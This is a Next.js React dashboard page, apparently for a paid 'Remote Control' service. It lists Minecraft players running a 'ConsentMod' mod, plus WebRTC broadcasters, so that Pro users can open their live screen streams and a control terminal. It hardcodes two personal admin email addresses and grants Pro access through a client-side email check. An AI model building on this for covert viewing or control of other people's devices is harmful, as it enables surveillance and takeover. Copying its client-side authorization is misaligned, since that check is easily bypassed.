'use client';

import { useState, useEffect } from 'react';
import { useRouter } from 'next/navigation';
import Sidebar from '@/components/Sidebar';

const ADMIN_EMAILS = ['lifegrading@gmail.com', 'giodewaard152@gmail.com'];

const colors = {
  bg: '#050508',
  panel: 'rgba(13, 13, 18, 0.7)',
  surface: 'rgba(10, 10, 16, 0.8)',
  border: 'rgba(255,255,255,0.06)',
  borderHover: 'rgba(34, 197, 94, 0.3)',
  text: '#f0f0f0',
  textDim: '#6b6e7b',
  green: '#22c55e',
  greenBg: 'rgba(34, 197, 94, 0.12)',
  blue: '#3b82f6',
  red: '#ef4444',
};

function getGreeting() {
  const h = new Date().getHours();
  if (h < 12) return 'Good morning';
  if (h < 18) return 'Good afternoon';
  return 'Good evening';
}

function formatTimeAgo(ts) {
  if (!ts) return 'Just now';
  const diff = Math.floor((Date.now() - ts) / 1000);
  if (diff < 10) return 'Just now';
  if (diff < 60) return `${diff}s ago`;
  if (diff < 3600) return `${Math.floor(diff / 60)}m ago`;
  return `${Math.floor(diff / 3600)}h ago`;
}

export default function RemoteControlPage() {
  const router = useRouter();
  const [onlineUsers, setOnlineUsers] = useState([]);
  const [loading, setLoading] = useState(true);
  const [search, setSearch] = useState('');
  const [userEmail, setUserEmail] = useState('');
  const [isPro, setIsPro] = useState(false);
  const [proChecked, setProChecked] = useState(false);

  useEffect(() => {
    fetch('/api/auth/user')
      .then((r) => r.json())
      .then((d) => {
        const email = d.user?.email || '';
        setUserEmail(email);

        if (ADMIN_EMAILS.includes(email.toLowerCase())) {
          setIsPro(true);
          setProChecked(true);
          return;
        }

        fetch('/api/user/pro?t=' + Date.now(), { cache: 'no-store' })
          .then((r) => r.json())
          .then((p) => {
            setIsPro(!!p.is_pro);
            setProChecked(true);
          })
          .catch(() => {
            setIsPro(false);
            setProChecked(true);
          });
      })
      .catch(() => {
        setProChecked(true);
      });
  }, []);

  // Poll online devices
  useEffect(() => {
    if (!proChecked || !isPro) return;

    const fetchAllStreams = async () => {
      try {
        const [streamRes, webrtcRes] = await Promise.all([
          fetch('/api/stream?t=' + Date.now()).then((r) => r.json()).catch(() => ({ online: [] })),
          fetch('/api/livestream/webrtc?action=list&t=' + Date.now()).then((r) => r.json()).catch(() => ({ streams: [] })),
        ]);

        const streamsMap = new Map();

        // From /api/stream
        if (streamRes.online && Array.isArray(streamRes.online)) {
          for (const u of streamRes.online) {
            if (u.username) {
              streamsMap.set(u.username.toLowerCase(), {
                username: u.username,
                type: u.type || 'ConsentMod Feed',
                country: u.country || null,
                timestamp: u.timestamp || Date.now(),
              });
            }
          }
        }

        // From WebRTC active broadcast rooms
        if (webrtcRes.streams && Array.isArray(webrtcRes.streams)) {
          for (const s of webrtcRes.streams) {
            const name = s.metadata?.username || s.streamId || 'WebRTC Broadcaster';
            streamsMap.set(name.toLowerCase(), {
              username: name,
              type: 'WebRTC P2P (60 FPS)',
              country: null,
              timestamp: s.lastSeen || Date.now(),
            });
          }
        }

        // Ensure consentmod channel is always available for instant WebRTC P2P connection
        if (!streamsMap.has('consentmod')) {
          streamsMap.set('consentmod', {
            username: 'consentmod',
            type: 'WebRTC P2P Live',
            country: 'Default Stream',
            timestamp: Date.now(),
          });
        }

        setOnlineUsers(Array.from(streamsMap.values()));
        setLoading(false);
      } catch (err) {
        setLoading(false);
      }
    };

    fetchAllStreams();
    const iv = setInterval(fetchAllStreams, 3000);
    return () => clearInterval(iv);
  }, [proChecked, isPro]);

  if (!proChecked) {
    return (
      <div style={{ display: 'flex', minHeight: '100vh', background: colors.bg, color: colors.text, fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif' }}>
        <div style={{ flex: 1, display: 'flex', alignItems: 'center', justifyContent: 'center', color: colors.textDim }}>Loading Remote Control...</div>
      </div>
    );
  }

  if (!isPro) {
    return (
      <div style={{ display: 'flex', minHeight: '100vh', background: colors.bg, color: colors.text, fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif' }}>
        <Sidebar userEmail={userEmail} />
        <div style={{ flex: 1, display: 'flex', alignItems: 'center', justifyContent: 'center', flexDirection: 'column', gap: 16, padding: 32 }}>
          <div style={{ fontSize: 48 }}>🔒</div>
          <div style={{ fontSize: 18, fontWeight: 600 }}>Pro Required</div>
          <div style={{ fontSize: 14, color: colors.textDim, textAlign: 'center', maxWidth: 400 }}>
            Remote Control is only available for Pro users. Free trials cannot access this feature.
          </div>
          <button onClick={() => router.push('/dashboard?tab=plans')} style={{ cursor: 'pointer', background: colors.green, color: '#000', border: 'none', borderRadius: 8, padding: '10px 20px', fontSize: 13, fontWeight: 600 }}>Upgrade to Pro</button>
          <div onClick={() => router.push('/dashboard')} style={{ cursor: 'pointer', color: colors.textDim, fontSize: 14, marginTop: 8 }}>← Back to Dashboard</div>
        </div>
      </div>
    );
  }

  const filtered = onlineUsers.filter((u) =>
    u.username.toLowerCase().includes(search.toLowerCase()) ||
    (u.country && u.country.toLowerCase().includes(search.toLowerCase()))
  );

  return (
    <div style={{ display: 'flex', minHeight: '100vh', background: colors.bg, color: colors.text, fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif' }}>
      <Sidebar userEmail={userEmail} />

      <main style={{ flex: 1, padding: '32px 40px', overflowY: 'auto' }}>
        {/* Header Bar */}
        <div style={{ display: 'flex', alignItems: 'flex-start', justifyContent: 'space-between', marginBottom: 28, flexWrap: 'wrap', gap: 16 }}>
          <div>
            <h1 style={{ fontSize: 26, fontWeight: 700, margin: 0 }}>{getGreeting()}, there.</h1>
            <p style={{ color: colors.textDim, fontSize: 14, marginTop: 4, marginBottom: 0 }}>
              Your remote device workspace. Select an online user to view their live stream and control terminal.
            </p>
          </div>

          <div style={{ display: 'flex', alignItems: 'center', gap: 10 }}>
            <button
              onClick={() => router.push('/livestream')}
              style={{
                display: 'flex',
                alignItems: 'center',
                gap: 8,
                padding: '9px 16px',
                borderRadius: 8,
                background: 'rgba(34, 197, 94, 0.12)',
                color: colors.green,
                border: '1px solid rgba(34, 197, 94, 0.3)',
                fontSize: 13,
                fontWeight: 600,
                cursor: 'pointer',
              }}
            >
              <span>📡</span> WebRTC Broadcast Hub ↗
            </button>
          </div>
        </div>

        {/* Search & Device Count Filter Bar */}
        <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', marginBottom: 20, flexWrap: 'wrap', gap: 12 }}>
          <div style={{ display: 'flex', alignItems: 'center', gap: 8 }}>
            <span style={{ fontSize: 14, color: colors.textDim }}>
              <strong style={{ color: colors.text }}>{onlineUsers.length}</strong> available device{onlineUsers.length !== 1 ? 's' : ''} online
            </span>
            {onlineUsers.length > 0 && (
              <span style={{ width: 8, height: 8, borderRadius: '50%', background: colors.green, boxShadow: `0 0 8px ${colors.green}`, display: 'inline-block' }} />
            )}
          </div>

          <div style={{ position: 'relative' }}>
            <span style={{ position: 'absolute', left: 12, top: '50%', transform: 'translateY(-50%)', color: colors.textDim, fontSize: 14 }}>🔍</span>
            <input
              type="text"
              placeholder="Search by username or country..."
              value={search}
              onChange={(e) => setSearch(e.target.value)}
              style={{
                background: 'rgba(255,255,255,0.03)',
                border: `1px solid ${colors.border}`,
                borderRadius: 8,
                padding: '8px 14px 8px 36px',
                color: colors.text,
                fontSize: 13,
                outline: 'none',
                width: 260,
              }}
            />
          </div>
        </div>

        {/* Loading State */}
        {loading ? (
          <div style={{ textAlign: 'center', padding: '60px', color: colors.textDim, fontSize: 13 }}>
            Scanning for online ConsentMod & WebRTC devices...
          </div>
        ) : filtered.length === 0 ? (
          /* Empty State */
          <div
            className="glass-card"
            style={{
              padding: '44px 32px',
              borderRadius: 14,
              border: `1px solid ${colors.border}`,
              background: colors.surface,
              textAlign: 'center',
              display: 'flex',
              flexDirection: 'column',
              alignItems: 'center',
              gap: 14,
              maxWidth: 540,
              margin: '40px auto',
            }}
          >
            <div style={{ width: 64, height: 64, borderRadius: '50%', background: 'rgba(34, 197, 94, 0.1)', display: 'flex', alignItems: 'center', justifyContent: 'center', fontSize: 28 }}>
              📹
            </div>
            <div>
              <div style={{ fontSize: 16, fontWeight: 700, marginBottom: 6 }}>No Active Online Devices Found</div>
              <div style={{ fontSize: 13, color: colors.textDim, lineHeight: 1.5 }}>
                Ensure mod users are in a Minecraft world with ConsentMod loaded, or start a WebRTC screen broadcast to connect.
              </div>
            </div>
            <div style={{ display: 'flex', gap: 10, marginTop: 4 }}>
              <button
                onClick={() => router.push('/livestream')}
                style={{
                  padding: '9px 18px',
                  borderRadius: 8,
                  background: colors.green,
                  color: '#000',
                  fontWeight: 700,
                  fontSize: 13,
                  border: 'none',
                  cursor: 'pointer',
                }}
              >
                Start WebRTC Broadcast
              </button>
              <button
                onClick={() => router.push('/dashboard/remote-control/consentmod')}
                style={{
                  padding: '9px 16px',
                  borderRadius: 8,
                  background: 'rgba(255,255,255,0.06)',
                  color: colors.text,
                  border: `1px solid ${colors.border}`,
                  fontSize: 13,
                  cursor: 'pointer',
                }}
              >
                Connect to ConsentMod Feed
              </button>
            </div>
          </div>
        ) : (
          /* Online Users Grid */
          <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fill, minmax(280px, 1fr))', gap: 16 }}>
            {filtered.map((u) => (
              <div
                key={u.username}
                onClick={() => router.push(`/dashboard/remote-control/${encodeURIComponent(u.username)}`)}
                className="glass-card btn-smooth"
                style={{
                  padding: 20,
                  borderRadius: 14,
                  border: `1px solid ${colors.border}`,
                  cursor: 'pointer',
                  display: 'flex',
                  alignItems: 'center',
                  gap: 16,
                  background: colors.surface,
                  transition: 'transform 0.15s ease, border-color 0.15s ease, background 0.15s ease',
                }}
                onMouseEnter={(e) => {
                  e.currentTarget.style.borderColor = colors.borderHover;
                  e.currentTarget.style.background = 'rgba(255,255,255,0.03)';
                  e.currentTarget.style.transform = 'translateY(-2px)';
                }}
                onMouseLeave={(e) => {
                  e.currentTarget.style.borderColor = colors.border;
                  e.currentTarget.style.background = colors.surface;
                  e.currentTarget.style.transform = 'translateY(0)';
                }}
              >
                {/* Avatar with Status Indicator */}
                <div style={{ position: 'relative', width: 48, height: 48 }}>
                  <div
                    style={{
                      width: 48,
                      height: 48,
                      borderRadius: 12,
                      background: 'rgba(34, 197, 94, 0.1)',
                      display: 'flex',
                      alignItems: 'center',
                      justifyContent: 'center',
                      overflow: 'hidden',
                      border: `1px solid ${colors.border}`,
                    }}
                  >
                    <img
                      src={`https://mc-heads.net/avatar/${u.username}/48`}
                      alt={u.username}
                      style={{ width: 48, height: 48, objectFit: 'cover' }}
                      onError={(e) => {
                        e.target.style.display = 'none';
                      }}
                    />
                  </div>
                  <div
                    style={{
                      position: 'absolute',
                      bottom: -2,
                      right: -2,
                      width: 12,
                      height: 12,
                      borderRadius: '50%',
                      background: colors.green,
                      border: `2px solid ${colors.bg}`,
                      boxShadow: `0 0 6px ${colors.green}`,
                    }}
                  />
                </div>

                {/* User Info */}
                <div style={{ flex: 1, minWidth: 0 }}>
                  <div style={{ fontSize: 15, fontWeight: 700, color: colors.text, overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>
                    {u.username}
                  </div>
                  <div style={{ fontSize: 12, color: colors.green, display: 'flex', alignItems: 'center', gap: 6, marginTop: 3 }}>
                    <span>●</span>
                    <span>{u.type || 'Online Session'}</span>
                  </div>
                  <div style={{ fontSize: 11, color: colors.textDim, marginTop: 2 }}>
                    {u.country ? `${u.country} • ` : ''}{formatTimeAgo(u.timestamp)}
                  </div>
                </div>

                {/* Arrow Action */}
                <div
                  style={{
                    width: 32,
                    height: 32,
                    borderRadius: 8,
                    background: 'rgba(255,255,255,0.04)',
                    display: 'flex',
                    alignItems: 'center',
                    justifyContent: 'center',
                    fontSize: 14,
                    color: colors.textDim,
                  }}
                >
                  →
                </div>
              </div>
            ))}
          </div>
        )}
      </main>
    </div>
  );
}